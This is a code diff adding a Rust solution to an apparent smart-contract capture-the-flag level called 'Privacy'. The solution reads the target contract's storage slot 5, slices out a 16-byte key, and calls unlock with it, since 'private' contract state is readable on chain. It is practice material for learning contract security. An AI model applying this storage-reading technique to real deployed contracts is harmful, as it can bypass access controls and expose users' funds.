@@ -20,12 +20,30 @@ impl ctf::Exploit for Exploit {
      * Understanding how storage works
      * Understanding how parameter parsing works
      * Understanding how casting works
+     *
+     * Tips:
+     * Remember that metamask is just a commodity. Use
+     * another tool if it is presenting problems.
+     *  Advanced gameplay could involve using remix, or
+     * your own web3 provider.
      */
     async fn attack(
         self,
         target: &Self::Target,
         offender: &ctf::Actor,
     ) -> eyre::Result<()> {
+        let five = H256::from_low_u64_be(5);
+        println!("{five:?}");
+        let slot = offender.get_storage_at(target.address, five, None).await?;
+        let mut key = [0; 16];
+        key.copy_from_slice(&slot.0[0..16]);
+
+        Privacy::new(target.address, offender.to_owned())
+            .unlock(key)
+            .send()
+            .await?
+            .await?;
+
         Ok(())
     }
 }
